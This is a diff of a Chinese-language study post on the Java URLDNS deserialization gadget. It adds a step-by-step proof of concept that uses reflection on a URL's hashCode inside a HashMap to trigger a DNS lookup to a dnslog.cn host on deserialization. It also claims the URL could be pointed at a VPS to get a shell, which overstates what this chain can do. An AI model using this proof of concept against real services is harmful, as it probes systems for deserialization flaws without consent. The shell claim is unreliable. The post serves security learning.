@@ -75,7 +75,7 @@ class exec {
 
 <br>
 
-**为什么会有readobjectt方法？**
+**为什么会有readobject方法？**
 
 假设有个数组，他的长度为100，但是我们只填充了30个数掘，后面70个在进行序列化的时候仍然会被算进去，造成浪费。所以JDK给开发者提供了两种方法，能够让我们自定义序列化和反序列化的过程:writeboject()和readobject()
 
@@ -210,6 +210,11 @@ putVal接收三个参数，第一个是key值的哈希，第二个是键，第�
 
 在实战中似乎可以将url改成vps来弹shell，有空我就试试
 
+## POC解析
+
+<br>
+
+
 贴一个杭电哥们的链子poc
 
 <br>
@@ -224,10 +229,10 @@ import java.util.HashMap;
  
 public class testUrldns{
     public static void main(String args[]) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {
-        //通过反射创建一个URL对象
+        
         Class urlClass = Class.forName("java.net.URL");
         Constructor urlCons = urlClass.getConstructor(String.class);
-        URL urlObject = (URL) urlCons.newInstance("http://vhec8z.dnslog.cn");
+        URL urlObject = (URL) urlCons.newInstance("xxxxx");
  
         //创建HashMap对象
         HashMap<URL,Integer> hashmap = new HashMap<>();
@@ -267,6 +272,59 @@ class uns {
 
 ````
 
+<br>
+
+首先是获取URL对象
+
+````
+public class testUrldns{
+    public static void main(String args[]) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {
+        Class urlClass = Class.forName("java.net.URL");
+        Constructor urlCons = urlClass.getConstructor(String.class);
+        URL urlObject = (URL) urlCons.newInstance("http://vhec8z.dnslog.cn");
+````
+
+<br>
+
+然后是创建一个hashmap对象
+
+<br>
+
+````
+HashMap<URL,Integer> hashmap = new HashMap<>();
+
+````
+
+<br>
+
+获取类里的hashCode方法
+
+````
+Field hashCode_url = urlClass.getDeclaredField("hashCode");
+hashCode_url.setAccessible(true);
+````
+
+<br>
+
+````
+hashCode_url.set(urlObject,114514);
+````
+
+设置键和值。这里的值不重要，随便设置，只要不是-1都行，因为hashcode的值为-1的时候就会使用上一次的结果的URL
+
+<br>
+
+put对象，反序列化
+
+````
+        hashmap.put(urlObject,1);
+        hashCode_url.set(urlObject,-1);
+        ser.serialize(hashmap);
+        uns.unserialize();
+````
+
+<br>
+
 复现成功
 
 <br>
@@ -275,8 +333,6 @@ class uns {
 
 <br>
 
-
-## POC解析
 
 
 <br><br><br>
